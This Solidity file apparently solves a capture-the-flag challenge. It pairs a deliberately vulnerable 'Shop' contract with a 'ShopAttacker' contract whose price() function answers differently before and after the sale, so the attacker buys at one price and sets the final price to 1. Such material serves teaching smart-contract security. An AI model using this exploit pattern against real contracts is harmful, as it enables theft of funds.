// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract ShopAttacker {
    Shop private shop;

    constructor(address _contractAddress) {
        shop = Shop(_contractAddress);
    }

    function price() public payable returns (uint256) {
        if (shop.isSold() == false) {
            return 101;
        }
        return 1;
    }

    function buy() public {
        shop.buy();
    }
}